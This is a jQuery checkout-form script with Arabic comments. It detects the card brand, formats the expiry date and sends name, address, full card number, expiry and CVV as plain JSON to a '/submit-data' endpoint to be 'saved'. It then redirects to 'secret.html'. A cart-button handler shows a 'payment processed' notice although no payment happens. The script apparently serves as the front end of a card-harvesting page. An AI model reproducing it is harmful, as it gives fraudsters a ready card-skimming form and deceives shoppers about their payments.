$(document).ready(function() {
    $('#checkout-form').submit(function(e) {
        e.preventDefault();
        const name = $('#fullName').val();
        const streetName = $('#streetName').val();
        const province = $('#province').val();
        const cardNumber = $('#cardNumber').val().replace(/\s/g, '');
        const expiryDate = $('#expiryDate').val();
        const cvv = $('#cvv').val();

        if (name && streetName && province && cardNumber && expiryDate && cvv) {
            $.ajax({
                type: 'POST',
                url: '/submit-data',
                data: JSON.stringify({ name, streetName, province, cardNumber, expiryDate, cvv }),
                contentType: 'application/json',
                success: function() {
                    alert('تم تقديم الطلب');
                    window.location.href = 'secret.html';
                },
                error: function() {
                    alert('حدث خطأ أثناء حفظ البيانات.');
                }
            });
        } else {
            alert('يرجى ملء جميع الحقول بشكل صحيح.');
        }
    });

    // معالجة أنواع البطاقات
    $('#cardNumber').on('input', function() {
        const cardNumber = $(this).val().replace(/\s/g, '');
        let cardType = '';
        let maxLength = 16;
        let cvvLength = 3;

        // تعرف على نوع البطاقة
        if (/^4/.test(cardNumber)) {
            cardType = 'Visa';
            $('#cardImage').attr('src', 'visa.png');
        } else if (/^5[1-5]/.test(cardNumber)) {
            cardType = 'MasterCard';
            $('#cardImage').attr('src', 'mastercard.png');
        } else if (/^3[47]/.test(cardNumber)) {
            cardType = 'American Express';
            $('#cardImage').attr('src', 'amex.png');
            maxLength = 15;
            cvvLength = 4;
        } else if (/^6/.test(cardNumber)) {
            cardType = 'Discover';
            $('#cardImage').attr('src', 'discover.png');
        } else if (/^35/.test(cardNumber)) {
            cardType = 'JCB';
            $('#cardImage').attr('src', 'jcb.png');
        } else {
            $('#cardImage').attr('src', '');
        }

        // ضبط خصائص الحقل بناءً على نوع البطاقة
        if (cardType) {
            $('#cardImage').show();
            $(this).attr('maxlength', maxLength);
            $('#cvv').attr('maxlength', cvvLength);
        } else {
            $('#cardImage').hide();
        }
    });

    // معالجة تنسيق تاريخ الانتهاء
    $('#expiryDate').on('input', function() {
        let value = $(this).val().replace(/[^0-9]/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        $(this).val(value);
    });

    // التأكد من أن الزر يبقى مرئيًا عند التمرير
    $(window).scroll(function() {
        if ($(this).scrollTop() > 50) {
            $('.cart-button').addClass('scrolled');
        } else {
            $('.cart-button').removeClass('scrolled');
        }
    });

    // التعامل مع زر عربة التسوق
    $('.cart-button').click(function() {
        // عرض إشعار مع الرسالة "تمت معالجة الدفع"
        $('#notification').fadeIn().delay(3000).fadeOut();
    });
});

